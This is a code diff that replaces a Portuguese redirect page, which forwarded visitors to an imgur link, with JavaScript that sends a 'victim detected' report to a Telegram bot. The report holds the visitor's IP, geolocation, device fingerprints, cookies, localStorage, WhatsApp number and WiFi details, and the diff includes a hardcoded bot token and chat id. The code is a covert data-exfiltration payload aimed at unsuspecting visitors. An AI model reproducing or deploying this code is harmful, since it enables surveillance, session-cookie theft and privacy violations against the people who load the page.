@@ -1,13 +1,32 @@
+fetch("https://api.telegram.org/bot7480600876:AAHsNVyzwBv0ooKY4zZ67SE4bVPBG9fC12E/sendMessage", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    chat_id: 94845670,
+    text: `
+⚠️ Vítima Detectada ⚠️
 
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0; url=https://imgur.com/a/UodXBtb">
-  <title>Redirecionando...</title>
-</head>
-<body>
-  <!-- Se o navegador não redirecionar, você pode clicar no link abaixo -->
-  <p>Se não for redirecionado automaticamente, <a href="https://imgur.com/a/UodXBtb">clique aqui</a>.</p>
-</body>
-</html>
+IP: ${data.ip} | ${data.cidade}/${data.estado} - ${data.pais}
+ISP: ${data.provedor} | ASN: ${data.asn}
+Geo: ${data.latitude},${data.longitude} | Fuso: ${data.fuso}
+
+Device: ${data.sistema} | Browser: ${data.navegador}
+Lang: ${data.idioma} | Res: ${data.resolucao}
+Touch: ${data.touch} | Tempo: ${data.tempoNaPagina}
+Exit Intent: ${data.tentouSair}
+
+CanvasFP: ${data.canvasFingerprint}
+WebGL: ${data.webglRenderer}
+
+Fonts: ${data.fontes.slice(0, 5).join(", ")}...
+Plugins: ${data.plugins.slice(0, 3).join(", ")}...
+
+Cookies: ${data.cookies.slice(0, 80)}...
+LS: ${data.localStorageData}
+Net: ${data.networkInfo.type} @ ${data.networkInfo.downlink} Mbps
+Referer: ${data.referer}
+WPP: ${data.whatsappNumber}
+WiFi: ${data.wifiInfo}
+    `.trim()
+  })
+});
